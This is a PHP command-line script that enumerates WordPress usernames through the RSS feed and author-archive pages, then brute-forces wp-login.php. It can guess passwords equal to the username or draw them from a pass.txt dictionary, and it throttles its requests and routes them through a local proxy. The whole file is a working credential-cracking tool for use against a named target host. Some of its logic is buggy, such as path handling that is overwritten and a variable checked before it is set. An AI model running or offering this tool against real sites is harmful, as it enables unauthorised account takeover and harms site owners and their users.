<?php

function get_user()
{
    global $host, $path;
    $authors = array();
	if ($path == "") $url="http://$host/?feed=rss2";
    $url = "http://$host/$path/?feed=rss2";
    if (@fopen($url, 'r')) {
        $res = send_pack($url, 0);
        if (preg_match_all('/<dc:creator><\!\[CDATA\[(.*?)\]\]><\/dc:creator>/', $res, $authors)) {
            $authors = array_unique($authors[1]);
        } else if (preg_match_all('/<dc:creator>(.*?)<\/dc:creator>/', $res, $authors)) {
            $authors = array_unique($authors[1]);
        }
    } else {
        for ($i = 1; $i <= 5; $i++) {
            $url = "http://$host/$path/?author=$i";
            $res = send_pack($url, 0);
            preg_match('/title=\'(.*?)\' rel=\'me\'/i', $res, $users);
            $authors[] = $users[1];
            $authors = array_filter($authors);
        }
    }
    return $authors;
}


function crack_login($user_arr, $pass_arr)
{
    global $host, $path;
	if ($path == "") $url="http://$host/wp-login.php";
    $url = "http://$host/$path/wp-login.php";
    $cracked = array();
    foreach ($user_arr as $user) {
		echo "current crack user --> ".$user."\n\n";
        $user = iconv('utf-8', 'gbk//IGNORE', $user);
        if ($pass_arr == 'same') {
            //$post = "log=" . urlencode($user) . "&pwd=" . urlencode($user) . "&wp-submit=%E7%99%BB%E5%BD%95&redirect_to=" . urlencode("http://$host/$path/") . "%2Fwp-admin%2F&testcookie=1";
			$post = "log=" . urlencode($user) . "&pwd=" . urlencode($user) . "&wp-submit=Log+In&redirect_to=" . urlencode("http://$host/$path/") . "%2Fwp-admin%2F&testcookie=1";
			sleep(10);
            $res = send_pack($url, $post);
            if (strpos($res, 'div id="login_error"') === false) {
                echo 'Username :' . $user . '   Password :' . $user . "\n\n";
                $cracked[] = $user;
            }
        } else {
            $pass_arr = array_unique($pass_arr);
            foreach ($pass_arr as $pass) {
                $pass = trim($pass);
                //$post = "log=" . urlencode($user) . "&pwd=" . urlencode($pass) . "&wp-submit=%E7%99%BB%E5%BD%95&redirect_to=http%3A%2F%2Flocalhost%2Fwordpress%2Fwp-admin%2F&testcookie=1";
				$post = "log=" . urlencode($user) . "&pwd=" . urlencode($pass) . "&wp-submit=Log+In&redirect_to=" . urlencode("http://$host/$path/") . "%2Fwp-admin%2F&testcookie=1";
				sleep(10);
                $res = send_pack($url, $post);
                //fwrite(fopen('a.txt','w'),$res);exit;
                if (strpos($res, 'div id="login_error"') === false) {
                    echo 'Username :' . $user . '   Password :' . $pass . "\n\n";
                }
            }
        }
    }
    return $cracked;
}

function send_pack($url, $post)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:27.0) Gecko/20100101 Firefox/27.0;by DarkR4y',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'Accept-Language: en-US,en;q=0.5'
    ));
	curl_setopt($ch, CURLOPT_PROXY, '127.0.0.1:8888'); //set proxy
    if ($post) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}


function func_time()
{
    list($microsec, $sec) = explode(' ', microtime());
    return $microsec + $sec;
}


function load_dict()
{
$a = array();
$f = fopen('user.txt','r');
while (!feof($f)) {
  $a[] = str_replace(array("\n","\r"),"",fgets($f, 1024));
}
fclose($f);
return $a;
}

//=========================main==================================
if ($argc < 4) {
    print_r('
+------------------------------------------------------+
Useage: php ' . $argv[0] . ' host path attack-mode
Host: target server (ip/hostname)
Path: path of wordpress
Nuberic: 1 for same as usr | 2 for pass dict 
Example: php ' . $argv[0] . ' localhost /wordpress 1
Example: php ' . $argv[0] . ' localhost /wordpress 2
user.txt for log dict & pass.txt for pwd dict
+------------------------------------------------------+
    ');
    exit;
}
$start_time = func_time();
set_time_limit(0);
error_reporting(7);
if (!extension_loaded('curl')) {
    exit('plz enable CURL extention!');
}
$host = $argv[1];
$path = $argv[2];
$type = $argv[3];
$auth = array();
//$auth = load_dict();
$auth = file('user.txt');
//exit(var_dump($auth));

echo 'count(Username): ' . count($auth) . "\n\n";
//print_r($auth);
if ($type == 1)
{
echo 'Cracking => the password same as username' . "\n\n";
$cracked = crack_login($auth, 'same');
}elseif($type == 2)
{
$passwords = file('pass.txt');
echo 'Cracking => password dict attack' . "\n\n";
if ($cracked) {
    $auth = array_diff($auth, $cracked);
}
crack_login($auth, $passwords);
}else
{
echo "invalid attack mode!\n\n";
exit();
}

echo 'elapsed time: ' . round((func_time() - $start_time), 4) . 's';
?> 
